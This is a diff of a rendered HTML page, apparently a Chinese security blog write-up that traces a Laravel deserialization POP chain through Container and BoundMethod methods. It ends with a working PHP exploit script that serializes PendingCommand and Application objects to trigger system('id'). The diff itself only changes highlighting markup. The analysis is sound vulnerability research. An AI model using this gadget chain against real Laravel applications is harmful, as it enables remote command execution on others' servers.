+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isBuildable</span><span class="p">(</span><span class="nv">$concrete</span><span class="p">,</span> <span class="nv">$abstract</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$object</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">build</span><span class="p">(</span><span class="nv">$concrete</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$object</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">make</span><span class="p">(</span><span class="nv">$concrete</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><blockquote>
 <p>由于$abstract值已知是<code>Illuminate\Contracts\Console\Kernel</code>且$needsContextualBuild为false，<a href="https://bycsec.top/2020/08/17/Laravel-popchain/" target="_blank" rel="noopener">Laravel-popchain</a>文章中师傅直接控制<code>$this-&gt;instances[$abstract]</code>，然后return结束<code>$this-&gt;app[Kernel::class]</code>过程向上执行Container类的call方法</p>
@@ -1119,22 +1119,22 @@ php artisan serve --host<span class="o">=</span>0.0.0.0
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">protected</span> <span class="k">function</span> <span class="nf">getConcrete</span><span class="p">(</span><span class="nv">$abstract</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nx">is_null</span><span class="p">(</span><span class="nv">$concrete</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getContextualConcrete</span><span class="p">(</span><span class="nv">$abstract</span><span class="p">)))</span> <span class="p">{</span>
-        <span class="k">return</span> <span class="nv">$concrete</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="c1">// If we don&#39;t have a registered resolver or concrete for the type, we&#39;ll just
-</span><span class="c1"></span>    <span class="c1">// assume each type is a concrete name and will attempt to resolve it as is
-</span><span class="c1"></span>    <span class="c1">// since the container should be able to resolve concretes automatically.
-</span><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">bindings</span><span class="p">[</span><span class="nv">$abstract</span><span class="p">]))</span> <span class="p">{</span>
-        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">bindings</span><span class="p">[</span><span class="nv">$abstract</span><span class="p">][</span><span class="s1">&#39;concrete&#39;</span><span class="p">];</span>
-    <span class="p">}</span>
-
-    <span class="k">return</span> <span class="nv">$abstract</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">protected</span> <span class="k">function</span> <span class="nf">getConcrete</span><span class="p">(</span><span class="nv">$abstract</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nx">is_null</span><span class="p">(</span><span class="nv">$concrete</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getContextualConcrete</span><span class="p">(</span><span class="nv">$abstract</span><span class="p">)))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$concrete</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// If we don&#39;t have a registered resolver or concrete for the type, we&#39;ll just
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// assume each type is a concrete name and will attempt to resolve it as is
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// since the container should be able to resolve concretes automatically.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">bindings</span><span class="p">[</span><span class="nv">$abstract</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">bindings</span><span class="p">[</span><span class="nv">$abstract</span><span class="p">][</span><span class="s1">&#39;concrete&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$abstract</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>此处<code>$this-&gt;bindings[$abstract]</code>可控，进而返回值也可控，我们可以直接控制bindings二维数组值为Application类然后通过build方法成功实例化Application类，最后也是通过<code>$this-&gt;instances[$abstract];</code>返回调用call方法。由于Application没有call方法，调用call时会向上调用父类Container的方法，这就是使用Application类的原因（悄咪咪地试过，使用Container类也是可以的🤣</p>
 <p><code>Illuminate\Container\Container::call</code></p>
@@ -1146,11 +1146,11 @@ php artisan serve --host<span class="o">=</span>0.0.0.0
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="nf">call</span><span class="p">(</span><span class="nv">$callback</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$parameters</span> <span class="o">=</span> <span class="p">[],</span> <span class="nv">$defaultMethod</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="k">return</span> <span class="nx">BoundMethod</span><span class="o">::</span><span class="na">call</span><span class="p">(</span><span class="nv">$this</span><span class="p">,</span> <span class="nv">$callback</span><span class="p">,</span> <span class="nv">$parameters</span><span class="p">,</span> <span class="nv">$defaultMethod</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">call</span><span class="p">(</span><span class="nv">$callback</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$parameters</span> <span class="o">=</span> <span class="p">[],</span> <span class="nv">$defaultMethod</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">BoundMethod</span><span class="o">::</span><span class="na">call</span><span class="p">(</span><span class="nv">$this</span><span class="p">,</span> <span class="nv">$callback</span><span class="p">,</span> <span class="nv">$parameters</span><span class="p">,</span> <span class="nv">$defaultMethod</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>跟进call方法</p>
 <p><code>Illuminate\Container\BoundMethod::call</code></p>
@@ -1170,19 +1170,19 @@ php artisan serve --host<span class="o">=</span>0.0.0.0
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">call</span><span class="p">(</span><span class="nv">$container</span><span class="p">,</span> <span class="nv">$callback</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$parameters</span> <span class="o">=</span> <span class="p">[],</span> <span class="nv">$defaultMethod</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="k">if</span> <span class="p">(</span><span class="k">static</span><span class="o">::</span><span class="na">isCallableWithAtSign</span><span class="p">(</span><span class="nv">$callback</span><span class="p">)</span> <span class="o">||</span> <span class="nv">$defaultMethod</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">return</span> <span class="k">static</span><span class="o">::</span><span class="na">callClass</span><span class="p">(</span><span class="nv">$container</span><span class="p">,</span> <span class="nv">$callback</span><span class="p">,</span> <span class="nv">$parameters</span><span class="p">,</span> <span class="nv">$defaultMethod</span><span class="p">);</span>
-    <span class="p">}</span>
-
-    <span class="k">return</span> <span class="k">static</span><span class="o">::</span><span class="na">callBoundMethod</span><span class="p">(</span><span class="nv">$container</span><span class="p">,</span> <span class="nv">$callback</span><span class="p">,</span> <span class="k">function</span> <span class="p">()</span> <span class="k">use</span> <span class="p">(</span><span class="nv">$container</span><span class="p">,</span> <span class="nv">$callback</span><span class="p">,</span> <span class="nv">$parameters</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">return</span> <span class="nx">call_user_func_array</span><span class="p">(</span>
-            <span class="nv">$callback</span><span class="p">,</span> <span class="k">static</span><span class="o">::</span><span class="na">getMethodDependencies</span><span class="p">(</span><span class="nv">$container</span><span class="p">,</span> <span class="nv">$callback</span><span class="p">,</span> <span class="nv">$parameters</span><span class="p">)</span>
-        <span class="p">);</span>
-    <span class="p">});</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">call</span><span class="p">(</span><span class="nv">$container</span><span class="p">,</span> <span class="nv">$callback</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$parameters</span> <span class="o">=</span> <span class="p">[],</span> <span class="nv">$defaultMethod</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="k">static</span><span class="o">::</span><span class="na">isCallableWithAtSign</span><span class="p">(</span><span class="nv">$callback</span><span class="p">)</span> <span class="o">||</span> <span class="nv">$defaultMethod</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">static</span><span class="o">::</span><span class="na">callClass</span><span class="p">(</span><span class="nv">$container</span><span class="p">,</span> <span class="nv">$callback</span><span class="p">,</span> <span class="nv">$parameters</span><span class="p">,</span> <span class="nv">$defaultMethod</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">static</span><span class="o">::</span><span class="na">callBoundMethod</span><span class="p">(</span><span class="nv">$container</span><span class="p">,</span> <span class="nv">$callback</span><span class="p">,</span> <span class="k">function</span> <span class="p">()</span> <span class="k">use</span> <span class="p">(</span><span class="nv">$container</span><span class="p">,</span> <span class="nv">$callback</span><span class="p">,</span> <span class="nv">$parameters</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">call_user_func_array</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$callback</span><span class="p">,</span> <span class="k">static</span><span class="o">::</span><span class="na">getMethodDependencies</span><span class="p">(</span><span class="nv">$container</span><span class="p">,</span> <span class="nv">$callback</span><span class="p">,</span> <span class="nv">$parameters</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>第一个判断过不了，直接下一步callBoundMethod方法</p>
 <p><code>Illuminate\Container\BoundMethod::callBoundMethod</code></p>
@@ -1207,24 +1207,24 @@ php artisan serve --host<span class="o">=</span>0.0.0.0
 </span><span class="lnt">17
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">protected</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">callBoundMethod</span><span class="p">(</span><span class="nv">$container</span><span class="p">,</span> <span class="nv">$callback</span><span class="p">,</span> <span class="nv">$default</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nx">is_array</span><span class="p">(</span><span class="nv">$callback</span><span class="p">))</span> <span class="p">{</span>
-        <span class="k">return</span> <span class="nv">$default</span> <span class="nx">instanceof</span> <span class="nx">Closure</span> <span class="o">?</span> <span class="nv">$default</span><span class="p">()</span> <span class="o">:</span> <span class="nv">$default</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="c1">// Here we need to turn the array callable into a Class@method string we can use to
-</span><span class="c1"></span>    <span class="c1">// examine the container and see if there are any method bindings for this given
-</span><span class="c1"></span>    <span class="c1">// method. If there are, we can call this method binding callback immediately.
-</span><span class="c1"></span>    <span class="nv">$method</span> <span class="o">=</span> <span class="k">static</span><span class="o">::</span><span class="na">normalizeMethod</span><span class="p">(</span><span class="nv">$callback</span><span class="p">);</span>
-
-    <span class="k">if</span> <span class="p">(</span><span class="nv">$container</span><span class="o">-&gt;</span><span class="na">hasMethodBinding</span><span class="p">(</span><span class="nv">$method</span><span class="p">))</span> <span class="p">{</span>
-        <span class="k">return</span> <span class="nv">$container</span><span class="o">-&gt;</span><span class="na">callMethodBinding</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="nv">$callback</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
-    <span class="p">}</span>
-
-    <span class="k">return</span> <span class="nv">$default</span> <span class="nx">instanceof</span> <span class="nx">Closure</span> <span class="o">?</span> <span class="nv">$default</span><span class="p">()</span> <span class="o">:</span> <span class="nv">$default</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">protected</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">callBoundMethod</span><span class="p">(</span><span class="nv">$container</span><span class="p">,</span> <span class="nv">$callback</span><span class="p">,</span> <span class="nv">$default</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nx">is_array</span><span class="p">(</span><span class="nv">$callback</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$default</span> <span class="nx">instanceof</span> <span class="nx">Closure</span> <span class="o">?</span> <span class="nv">$default</span><span class="p">()</span> <span class="o">:</span> <span class="nv">$default</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Here we need to turn the array callable into a Class@method string we can use to
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// examine the container and see if there are any method bindings for this given
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// method. If there are, we can call this method binding callback immediately.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$method</span> <span class="o">=</span> <span class="k">static</span><span class="o">::</span><span class="na">normalizeMethod</span><span class="p">(</span><span class="nv">$callback</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$container</span><span class="o">-&gt;</span><span class="na">hasMethodBinding</span><span class="p">(</span><span class="nv">$method</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$container</span><span class="o">-&gt;</span><span class="na">callMethodBinding</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="nv">$callback</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$default</span> <span class="nx">instanceof</span> <span class="nx">Closure</span> <span class="o">?</span> <span class="nv">$default</span><span class="p">()</span> <span class="o">:</span> <span class="nv">$default</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>可以看到这个方法的目的就是将数组转化为可满足<code>Class@method</code>格式的字符串，因此直接跳到下一步，看后面的<code>call_user_func_array</code>函数，回调函数callback即为我们控制的system，参数是由静态方法getMethodDependencies提供</p>
 <p><code>Illuminate\Container\BoundMethod::getMethodDependencies</code></p>
@@ -1242,17 +1242,17 @@ php artisan serve --host<span class="o">=</span>0.0.0.0
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">protected</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">getMethodDependencies</span><span class="p">(</span><span class="nv">$container</span><span class="p">,</span> <span class="nv">$callback</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$parameters</span> <span class="o">=</span> <span class="p">[])</span>
-<span class="p">{</span>
-    <span class="nv">$dependencies</span> <span class="o">=</span> <span class="p">[];</span>
-
-    <span class="k">foreach</span> <span class="p">(</span><span class="k">static</span><span class="o">::</span><span class="na">getCallReflector</span><span class="p">(</span><span class="nv">$callback</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">getParameters</span><span class="p">()</span> <span class="k">as</span> <span class="nv">$parameter</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">static</span><span class="o">::</span><span class="na">addDependencyForCallParameter</span><span class="p">(</span><span class="nv">$container</span><span class="p">,</span> <span class="nv">$parameter</span><span class="p">,</span> <span class="nv">$parameters</span><span class="p">,</span> <span class="nv">$dependencies</span><span class="p">);</span>
-    <span class="p">}</span>
-
-    <span class="k">return</span> <span class="nx">array_merge</span><span class="p">(</span><span class="nv">$dependencies</span><span class="p">,</span> <span class="nv">$parameters</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">protected</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">getMethodDependencies</span><span class="p">(</span><span class="nv">$container</span><span class="p">,</span> <span class="nv">$callback</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$parameters</span> <span class="o">=</span> <span class="p">[])</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$dependencies</span> <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="k">static</span><span class="o">::</span><span class="na">getCallReflector</span><span class="p">(</span><span class="nv">$callback</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">getParameters</span><span class="p">()</span> <span class="k">as</span> <span class="nv">$parameter</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">static</span><span class="o">::</span><span class="na">addDependencyForCallParameter</span><span class="p">(</span><span class="nv">$container</span><span class="p">,</span> <span class="nv">$parameter</span><span class="p">,</span> <span class="nv">$parameters</span><span class="p">,</span> <span class="nv">$dependencies</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">array_merge</span><span class="p">(</span><span class="nv">$dependencies</span><span class="p">,</span> <span class="nv">$parameters</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>这一段是通过反射获取callback实例的参数然后将$dependencies和参数列表合并，但是$dependencies就是空值，所以并不影响参数列表，最后就等于执行<code>call_user_func_array(&quot;system&quot;,array(&quot;id&quot;));</code></p>
 <p>exp</p>
@@ -1290,37 +1290,37 @@ php artisan serve --host<span class="o">=</span>0.0.0.0
 </span><span class="lnt">30
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="k">namespace</span> <span class="nx">Illuminate\Foundation\Testing</span><span class="p">{</span>
-    <span class="k">class</span> <span class="nc">PendingCommand</span><span class="p">{</span>
-        <span class="k">protected</span> <span class="nv">$app</span><span class="p">;</span>
-        <span class="k">protected</span> <span class="nv">$command</span><span class="p">;</span>
-    	<span class="k">protected</span> <span class="nv">$parameters</span><span class="p">;</span>
-        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$app</span><span class="p">,</span> <span class="nv">$command</span><span class="p">,</span> <span class="nv">$parameters</span><span class="p">){</span>
-        	<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">app</span> <span class="o">=</span> <span class="nv">$app</span><span class="p">;</span>
-        	<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">command</span> <span class="o">=</span> <span class="nv">$command</span><span class="p">;</span>
-        	<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parameters</span> <span class="o">=</span> <span class="nv">$parameters</span><span class="p">;</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-
-<span class="k">namespace</span> <span class="nx">Illuminate\Foundation</span><span class="p">{</span>
-	<span class="k">class</span> <span class="nc">Application</span><span class="p">{</span>
-		<span class="k">protected</span> <span class="nv">$bindings</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
-		<span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$bindings</span> <span class="o">=</span> <span class="p">[]){</span>
-			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">bindings</span><span class="p">[</span><span class="s2">&#34;Illuminate\Contracts\Console\Kernel&#34;</span><span class="p">][</span><span class="s2">&#34;concrete&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$bindings</span><span class="p">;</span>
-
-		<span class="p">}</span>
-	<span class="p">}</span>
-<span class="p">}</span>
-
-<span class="k">namespace</span><span class="p">{</span>
-	<span class="nv">$app1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Illuminate\Foundation\Application</span><span class="p">();</span>
-	<span class="nv">$app2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Illuminate\Foundation\Application</span><span class="p">(</span><span class="nv">$app1</span><span class="p">);</span>
-	<span class="nv">$com</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Illuminate\Foundation\Testing\PendingCommand</span><span class="p">(</span><span class="nv">$app2</span><span class="p">,</span> <span class="s2">&#34;system&#34;</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;id&#34;</span><span class="p">));</span>
-	<span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$com</span><span class="p">));</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">Illuminate\Foundation\Testing</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">PendingCommand</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">protected</span> <span class="nv">$app</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">protected</span> <span class="nv">$command</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    	<span class="k">protected</span> <span class="nv">$parameters</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$app</span><span class="p">,</span> <span class="nv">$command</span><span class="p">,</span> <span class="nv">$parameters</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        	<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">app</span> <span class="o">=</span> <span class="nv">$app</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        	<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">command</span> <span class="o">=</span> <span class="nv">$command</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        	<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parameters</span> <span class="o">=</span> <span class="nv">$parameters</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">Illuminate\Foundation</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">class</span> <span class="nc">Application</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">protected</span> <span class="nv">$bindings</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">		<span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$bindings</span> <span class="o">=</span> <span class="p">[]){</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">bindings</span><span class="p">[</span><span class="s2">&#34;Illuminate\Contracts\Console\Kernel&#34;</span><span class="p">][</span><span class="s2">&#34;concrete&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$bindings</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$app1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Illuminate\Foundation\Application</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$app2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Illuminate\Foundation\Application</span><span class="p">(</span><span class="nv">$app1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$com</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Illuminate\Foundation\Testing\PendingCommand</span><span class="p">(</span><span class="nv">$app2</span><span class="p">,</span> <span class="s2">&#34;system&#34;</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;id&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	<span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$com</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h2 id="总结"><a href="#总结" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:总结" class="headings">总结</a></h2>
 <p>1、入口函数<code>__destruct</code>(可能会有从wakeup开始的情况，具体情况具体分析)</p>
